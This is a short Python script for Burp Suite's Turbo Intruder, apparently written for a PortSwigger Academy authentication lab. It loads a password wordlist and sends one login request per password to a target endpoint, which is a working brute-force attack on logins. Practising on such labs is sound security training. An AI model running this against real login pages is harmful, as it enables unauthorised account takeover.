passwords = []
with open("$HOME/Documents/Python/PortswiggerAcademyLabs/Authentication/password.txt", "r") as f:
    passwords = [x.strip() for x in f.readlines()]

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=500,
                           pipeline=False,
                           engine=Engine.THREADED,
                           timeout=20
                           )

    for password in passwords:
        engine.queue(target.req, [ password], label=password)




def handleResponse(req, interesting):
    table.add(req)
